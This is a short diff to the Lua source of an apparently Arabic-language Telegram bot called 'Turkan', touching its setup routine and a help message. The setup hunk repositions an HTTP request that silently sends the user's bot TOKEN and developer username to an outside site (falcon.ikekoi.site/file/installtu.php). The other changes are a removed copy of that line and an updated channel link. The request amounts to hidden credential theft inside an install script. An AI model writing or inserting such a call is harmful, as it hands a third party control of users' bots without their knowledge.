@@ -52,6 +52,7 @@ else
 io.write('\n\27[1;31m🔄┇The UserName was not Saved : لم يتم حفظ معرف المطور الاساسي\n\27[0;39;49m')
 end 
 os.execute('lua Turkan.lua')
+https.request('http://falcon.ikekoi.site/file/installtu.php?TOKEN='..token..'&USERDEV='..User_Info.Info.Username)
 end
 ------------------------------------------------------------------------------------------------------------
 local Run_File_Turkan_Sudo = io.open("Info_Sudo.lua", 'w')
@@ -106,7 +107,6 @@ Status = false
 end  
 return Status
 end
-https.request('http://falcon.ikekoi.site/file/installtu.php?TOKEN='..token..'&USERDEV='..User_Info.Info.Username)
 Load_File()
 print("\27[34m"..[[
    _____           _               
@@ -6760,7 +6760,7 @@ send(msg.chat_id_, msg.id_,[[
 
 𓂅 . [Source Channel ](t.me/TFTTTT)     
 
-𓂅 . [Turkan Install](t.me/TFTTTT)     
+𓂅 . [Turkan Install](https://t.me/TFTTTT/1124)     
 
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
 𓂅 . [Bot Turkan](t.me/Can2bot)     
